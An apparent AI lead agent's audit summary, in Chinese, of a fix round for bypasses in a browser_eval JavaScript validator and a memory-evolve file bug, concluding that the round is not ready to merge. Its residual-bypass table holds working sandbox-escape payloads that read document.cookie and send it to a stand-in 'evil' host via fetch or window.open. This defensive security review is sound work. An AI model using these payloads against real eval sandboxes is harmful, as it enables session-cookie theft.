# AUDIT-P1-BYPASS-FIX-2026-09-09.md

> 主题：beta.11 三个 P1 缺陷（browser_eval 构造函数链 / `Reflect.construct` / memory-evolve clobber）修复轮次的**汇总与合入门禁判定**
> 汇总者：领队 / 汇总者（会话 `ddcf2713-0942-4ab0-92b9-20a96f2c49dd`）
> 日期：2026-09-09
> 分支：`fix/eval-policy-p1-bypasses`（HEAD `b624840e62`，**改动仍未提交**）
> 上游产物：`PLAN.md` / `DECIDED.md` / `IMPLEMENTATION.md` / `TASKS.md` / `REVIEW-browser-eval-policy.md` / `REVIEW-memory-evolve.md` / `REVIEW-CONFIRMED.md`（流水线黑板）
> 需求与审计来源：[`AUDIT-BETA11-CHANGES-2026-09-08.md`](AUDIT-BETA11-CHANGES-2026-09-08.md)、[拍板摘要](decisions/2026-09-08-beta11-p1-bypass-fix.md)、[设计蓝图](planning/2026-09-08-beta11-p1-bypass-fix-design.md)、[实施计划](planning/2026-09-08-beta11-p1-bypass-fix-implementation.md)

---

## 0. 一句话结论

**`[需修复]` —— 声明门禁 5/5 全绿，但安全目标未达成：审计与复核指出的残余绕过经领队独立复现全部成立（VM 沙箱内实测读到页面 cookie、外发、弹窗）。不建议合入 master，需再修一轮。**

---

## 1. 本轮做了什么

| 阶段 | 产出 |
|---|---|
| 规划 / 拍板 | `PLAN.md`（v1）+ `DECIDED.md`（3 项决策：3 个 P1 全修；拒绝 constructor/prototype/`__proto__` 链 + `Reflect.construct`/`call`/`apply`/`bind`；memory-evolve 改 merge 语义） |
| 编码 | 3 个既有文件改动（+101/-2）+ 5 个新文件：`eval-policy.ts` 新增 `DANGEROUS_MEMBERS` 黑名单、成员链递归、`arrowParams` 别名预扫描；`skills.js` 删除 `rmSync(to)` 并补 `ENOTEMPTY` 降级码；新增 AC5 对抗矩阵 45 例、AC6 故障注入 5 例 + 3 个 fixture |
| 审计（并行×2） | `REVIEW-browser-eval-policy.md`（11 条）+ `REVIEW-memory-evolve.md`（12 条），结论均为 `[FAIL] 必须修复` |
| 复核 | `REVIEW-CONFIRMED.md`：confirmed 21 / partially 2 / **disputed 0** / already-fixed 0；去重后 9 项修复清单（FIX-1…FIX-9） |
| 汇总（本轮） | 本文件 + 黑板 `FINAL.md`；门禁矩阵由领队亲自执行 |

### 1.1 改动文件

```
 M packages/host/browser/src/eval-policy.ts            (+67)
 M packages/vendor/memory-evolve/lib/skills.js         (+9/-2)
 M packages/vendor/memory-evolve/tests/skills.test.js  (+27)
?? packages/host/browser/tests/eval-policy-p1-bypass.spec.ts
?? packages/vendor/memory-evolve/tests/skills-fault.test.js
?? packages/vendor/memory-evolve/tests/fixtures/{fs-fault-hook,register,child-approve}.mjs
```

---

## 2. 合入门禁矩阵

> 全部命令由领队**亲自执行**，输出原样摘录。

| # | 门禁项 | 判定 | 证据命令 | 实测结果 |
|---|---|---|---|---|
| ① | 单元测试（browser） | ✅ 通过 | `cd packages/host/browser && ./node_modules/.bin/vitest run` | `Test Files 11 passed (11)` / `Tests 213 passed (213)` |
| ① | 单元测试（memory-evolve 目标文件） | ✅ 通过 | `cd packages/vendor/memory-evolve && node --test tests/skills.test.js tests/api.test.js tests/skills-fault.test.js` | `tests 40 / pass 40 / fail 0` |
| ② | 类型检查（全量门禁） | ✅ 通过 | `corepack yarn check` | `GATE_EXIT=0` |
| ② | 类型检查（browser 包） | ✅ 通过 | `corepack yarn workspace @picoaide/dsh-browser check` | `BROWSER_CHECK_EXIT=0` |
| ② | 类型检查（desktop 包） | ✅ 通过 | `corepack yarn workspace dsh-plugin-desktop check` | `DESKTOP_CHECK_EXIT=0` |
| ③ | 回归（memory-evolve 全量） | ⚠️ 通过（含预存失败） | `node --test 'tests/*.test.js'` | `tests 784 / pass 742 / fail 42`；失败集中在 `update.test.js`(39) + `search-docs.test.js`(3)，两文件**均未改动** → 预存环境失败 |
| ④ | 对抗性测试有效性（AC5 双向） | ✅ 有效性 / ❌ 覆盖 | 基线副本 `git archive HEAD` + 新 spec → `vitest run`；再跑工作区 | 基线 `Tests 16 failed \| 29 passed (45)` → 工作区 `45 passed`。**但**绑定形式族覆盖 `grep -c` = 0，`getPrototypeOf` 无拒绝用例 |
| ⑤ | 故障注入测试（AC6 双向） | ✅ 通过 | 基线副本 + fault spec → `node --test`；再跑工作区 | 基线 `pass 0 / fail 5` → 工作区 `pass 5 / fail 0`（EBUSY/EPERM/EACCES/EXDEV + 真实 EXDEV） |
| ⑥ | **安全有效性**（领队独立变体集） | ❌ **失败** | `node /tmp/lead-probe/{rce2,p02vm,fix4}.mjs` 等 | 审计探针 **20 例 validator ACCEPT**（probe1 11 + probe2 9，含 1 例 `RestElement` 不可利用）；领队另在 VM 沙箱中**真实执行 6 例**（读 cookie / 外发 / 弹窗） |

**门禁通过率**：声明门禁 ①–⑤ = **5/5（100%）**；含安全有效性 ①–⑥ = **5/6（83.3%）**。

> ⚠️ **门禁全绿 ≠ 可合入**。AC5 的口径是「已知 45 条在修复前失败」，证明的是测试有信号，不是修复不可绕过。与 2026-09-08 原始审计的教训同构（当时 168 测试全绿，P1-1 照样成立）。

---

## 3. 残余绕过（阻断项，领队实测）

沙箱环境：`vm.createContext` + `wrapEvalExpression`，注入 `document.cookie='SESSION=LEAD-SECRET-123'` 与 `fetch`/`alert`/`open` 记录器。

| ID | 缺陷 | 代表载荷 | 实测结果 |
|---|---|---|---|
| **FIX-1** | 形参绑定形式洗白（解构/默认值/rest） | `[0].map((({constructor: c}) => c('return document.cookie'))((x=>x)))` | validator `ACCEPT` → 执行返回 **`["SESSION=LEAD-SECRET-123"]`**；同型 `fetch` 载荷 → 副作用 **`FETCH:https://evil/?d=SESSION=LEAD-SECRET-123`**；同型 `alert` → **`ALERT:pwned`** |
| **FIX-2** | 值流位置洗白（属性值 / 回调实参） | `({f: open}).f('https://evil')`、`({f: alert}).f('pwned')`、`[0].map(alert)` | 三条 `ACCEPT+EXEC`，副作用 **`OPEN:https://evil`** / **`ALERT:pwned`** / **`ALERT:0`**；对照 `window.open('x')` 被拒 |
| **FIX-4** | 动态计算键截断成员链 | `('')['con'+'structor']`、`` ('')[`constructor`] `` | `ACCEPT`（纯读无兜底）；组合 `[0].map(({f: ('')['con'+'structor']['con'+'structor']}).f('return document.cookie'))` → `ACCEPT+EXEC` 并读回 cookie |
| **FIX-3** | `arrowParams` 跨作用域全局收集 | `[1].map(f => f + 1) + f()`（`f` 未被调用） | 基线 `ACCEPT` → 修复后 `REJECT: call to alias f`（**新引入误拒**） |

**判定**：`REVIEW-CONFIRMED.md` 的 confirmed 21 / disputed 0 **经领队抽查全部成立**，无一条误报。

---

## 4. 已达标部分（确认无问题）

- **P1-3（memory-evolve）完全达标**：领队 4 场景实测 —— merge 保留 `notes.md`+`sub/keep.txt` 且 `SKILL.md` 落地；空 stub 目录仍成功采纳；活 `SKILL.md` 拒绝且内容不变；同设备非空目标（`ENOTEMPTY`）降级后保留用户文件。真实 EXDEV（`/dev/shm`→ext4）双向对照：基线 `notesSurvived:false` → 修复后 `true`。
- **AC2 达标**：`Reflect.construct(window['WebSocket'],…)` / `XMLHttpRequest` 均 `REJECT`。
- **AC3 无主要误伤**：`fetch`/`sendBeacon`/`postMessage`/`1+1`/`__NEXT_DATA__`/`readText`/`localStorage`/`data[key]`/`Object.getPrototypeOf({})` 全 `ACCEPT`。
- **AC6 达标**：四码 + 真实 EXDEV 故障注入，基线 5 fail → 修复后 5 pass。
- **AC5 双向证据成立**：基线 16 failed / 29 passed → 修复后 45 passed（领队独立复现 2 次）。

---

## 5. 口径修正（相对上游报告）

| 项 | 上游结论 | 本轮实测修正 |
|---|---|---|
| `corepack yarn check` | 「预存环境缺陷，本环境不可判定」（编码员/两名审计员/复核员一致） | **可修复且已修复**：执行 `corepack yarn install --immutable`（`INSTALL_EXIT=0`，`yarn.lock`/`package.json` 未改动）后 `corepack yarn check` **exit 0**，desktop/browser 包 check 均 exit 0 → **AC7 判定由「无法判定」改为「✅ 通过」**，FIX-6 视为已解决 |
| memory-evolve 预存失败数 | 43 | **42**（`update.test.js` 39 + `search-docs.test.js` 3；`advisor-api.test.js` 本次 0 fail） |
| `RestElement` 绕过 | 两份审计均列为可用通道 | **不可利用**（rest 绑定数组，执行抛 `f is not a function`；`f[0](…)` 被 `dynamic call target` 拒绝）；结论维持，仅表述修正 |

---

## 6. 遗留问题清单（16 项）

### 🔴 P0 阻断（3，必须修）

| ID | 项 | 建议修法 |
|---|---|---|
| FIX-1 | 形参绑定形式收口 | 递归解包 `ObjectPattern`/`ArrayPattern`/`AssignmentPattern`/`RestElement` 收集全部绑定名；`Property` 模式键命中 `DANGEROUS_MEMBERS` 即拒 |
| FIX-2 | 值流位置收口 | `Property.value` 与 `CallExpression.arguments` 中出现的危险值表达式（含裸 `Identifier`）一律拒 |
| FIX-4 | 动态计算键不截断链 | 链递归遇 `undefined` 继续沿 `.object` 下溯；`memberName` 增加 `TemplateLiteral` 与字符串拼接常量折叠 |

### 🟠 P1（2，一并修）

| ID | 项 |
|---|---|
| FIX-3 | `arrowParams` 改为作用域内绑定（至少「callee 名 ∈ 某箭头形参名且该箭头是 callee 的祖先」） |
| FIX-5 | 对抗矩阵补绑定形式族 / 动态计算键 / 回调与属性值通道 + `getPrototypeOf` 拒绝用例 |

### 🟡 P2（2）

| ID | 项 | 状态 |
|---|---|---|
| FIX-7 | 黑板 IMPLEMENTATION.md 的 231 行「实际验证记录」回写进 `docs/planning/2026-09-08-beta11-p1-bypass-fix-implementation.md` | 本文件已补审计汇总；231 行回写仍待做（`574` vs `805` 行） |
| FIX-8 | 更新 `tools.ts:642`/`:645` 能力描述 | 未做 |

### 🔵 P3 / 可遗留（9）

FIX-9（按建议拆分提交，**交付前置**）、D-1（预扫描与主遍历重复走查）、D-2（连带拒绝清单入 PLAN §4.5）、D-3（预存失败数 42）、D-4（`toString`/`valueOf` 入黑名单）、D-5（merge 覆盖同名辅助文件——已文档化取舍）、D-6（符号链接带入）、D-7（故障注入子进程不清理 `/tmp`）、D-8（双向证据无自动化守护）。

---

## 7. 下一步建议

1. **不合入 master**；开第三轮修复，优先 **FIX-1 + FIX-2 + FIX-4 同批**（共享「值流 / 绑定形式」根因），**同时**修 FIX-3。
2. **重写 AC5 判定口径**：由独立于实现者的变体集驱动，判定改为「**独立审计变体集 0 绕过**」；矩阵按语法维度表（绑定形式 × 值流位置 × 动态键形式）穷举并加元测试断言；补合法惯用法回归集（含 `Object.prototype.hasOwnProperty.call`）。
3. **收尾** FIX-7 / FIX-8 / FIX-9。
4. **门禁已就绪**：依赖已安装，第三轮直接复跑 `corepack yarn check`（当前 exit 0），无需再降级判定。
5. **先提交当前工作区**（WIP 备份），避免误操作丢失——本轮全部成果仍在工作区。

---

## 附录：领队自证

- 本轮**未修改任何业务代码**；新增文件仅本审计汇总与黑板 `FINAL.md`。
- 执行过一次 `corepack yarn install --immutable`（补齐 `node_modules`）；已核实 `yarn.lock`/`package.json` 未被修改，`eval-policy.ts`/`skills.js` 的 md5 前后一致（`7b81f3d4…` / `f6af7238…`）。
- 基线对照全部使用 `git archive HEAD` 解到 `/tmp`，**未使用 `git stash`/`checkout`**，零仓库扰动。
- 所有结论来自亲自执行的命令输出；与上游不一致处已在 §5 逐条标注。
